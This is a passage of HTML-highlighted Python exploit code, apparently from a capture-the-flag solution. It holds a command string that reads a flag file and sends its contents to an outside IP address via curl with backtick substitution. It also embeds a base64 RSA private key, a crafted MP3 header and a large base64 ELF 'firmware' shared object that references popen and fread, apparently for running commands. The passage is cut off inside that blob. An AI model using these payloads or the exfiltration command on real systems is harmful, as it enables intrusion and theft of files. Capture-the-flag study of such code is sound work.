class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">1.0</span></span><br><span class="line">retry_count = <span class="number">5</span></span><br><span class="line">logging = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">site_url = <span class="string">''</span></span><br><span class="line">s = requests.session()</span><br><span class="line">time_zone_offset = <span class="number">60</span> * <span class="number">60</span> * <span class="number">8</span></span><br><span class="line"><span class="comment"># command = "/usr/bin/tac /fl*g*"</span></span><br><span class="line">command = <span class="string">"curl http://47.90.204.28/`/usr/bin/tac /fl*g*`"</span></span><br><span class="line"><span class="comment"># command = "ls"</span></span><br><span class="line"></span><br><span class="line">preset_key = b64decode(<span class="string">'LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUNkd0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQW1Fd2dnSmRBZ0VBQW9HQkFPTWp4eXVIcWRuSmFyUDAKSHl1eFVVRHkvY1BGaWMzYjM5WUQrVzY5R2VSRkpMRDUraFhaM3lYMTFBQ2pMSHpESFpIbGgrajRQZncxdEhMMApwY3FPZmJ0TTF4am5sV2FKd3lZQzRpWlBSRXJUTGNVd282UmhKS2diUkxHQVpLUmxmWFFMbVRwbGd0ZnJoUGhJCng0ZzM2ZEtLTVVlYjZnOHJ3blVrUnVYSVlhd2hBZ01CQUFFQ2dZRUEwUWZrQzFOV0pHOFFHM3ZXRThlakZ6cUgKL3RxVDd6Y2h6enJwR2RnOU02M09EbkIramcxckp1d01wbW1FVDJ6Z2tadkNiOHZFZjQ2TStoM2JWWVc4Zmg1Zwp4dTlXdmJFb0orUGZtV2R6SmowUlRYT05vZXVzRUgwODI3eGl6UXlIc21RbkNBQzkyUS9IQlg4WVl0eDgxN0pOCnNIUmNFMHdacVFmL0dkU0VnK0VDUVFEMGVjUlJYN3BsT0hTOHNjTjFqT3FOMEl5S2pvamljWWNQL2h3ckU2ZjIKZGR3dEpnNlJBb3E3SHlRdUFjYmZCazJwdS9UeDRsSHRycm9qRXlxQTRLdjdBa0VBN2RqUEFCakEvaHlpV1oxTQpDUm5DTTRudWdDUEE1SXRxZktzb3UvbE51cUdYZXFVYW5XNjBTcmJDVWJrM2g2NnkwdXV2T0xzendEWllONnNNClFEWFJrd0pBUlB3N1BtOFJ6TkF5ZUxCOHBDWUFaY1lNY21pb0RhWFZZOWpqbi9BcS9Ddmoxa1dmNUtGZi9rOWEKU1RVdEplL0VhSG5tTTM4V2VVaE5zK29MbTFSS2t3SkFNcCtyNTJ4ZFgzaSt3VzR1YWQxMnJUdVZiT2F2UHJYQgowNGttb1dPOXZKUjZSbHR2MzhSWlVYRzJ5R2d3dm90YmVuTTVsMHlaQmpkSzdZWlZsREVnU3dKQkFMb29yYmZnCkJzMW5BbGU3WnhXK0JkRXlLVG9ZUWdWVU1MRytWeDFITW9rU0dZNlh6blNFYzdpK25weFBoeGd6Q1VWdHpxNU4KR3E4Q3ppN2FJUFVuY0lnPQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg=='</span>)</span><br><span class="line">preset_music = b64decode(<span class="string">'SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJiYmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYWFhYQA='</span>)</span><br><span class="line">preset_firmare = b64decode(<span class="string">'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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXVLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXiLwAA/yXkLwAADx9AAP8l4i8AAGgAAAAA6eD/////JdovAABoAQAAAOnQ/////yXSLwAAaAIAAADpwP////8lyi8AAGgDAAAA6bD/////JYIvAABmkAAAAAAAAAAASI09wS8AAEiNBbovAABIOfh0FUiLBT4vAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09kS8AAEiNNYovAABIKf5Iwf4DSInwSMHoP0gBxkjR/nQUSIsFFS8AAEiFwHQI/+BmDx9EAADDDx+AAAAAAIA9aS8AAAB1L1VIgz32LgAAAEiJ5XQMSIs9Ki8AAOhd////6Gj////GBUEvAAABXcMPH4AAAAAAww8fgAAAAADpe////1VIieVIg+wQSIsFpC4AAEiLALowAQAAvgAAAABIicfo9/7//0iNNaAOAABIjT2hDgAA6PT+//9IiUX4SIN9+AB0MUiLBWouAABIiwBIi1X4SInRugABAAC+AQAAAEiJx+iW/v//SItF+EiJx+ia/v//6wGQycMASIPsCEiDxAjDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByAAAAAAAAAGFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAARsDOyAAAAADAAAAFO///zwAAABk7///ZAAAACnw//98AAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAADQ7v//UAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABQAAABEAAAA+O7//wgAAAAAAAAAAAAAABwAAABcAAAApe///3YAAAAAQQ4QhgJDDQYCcQwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA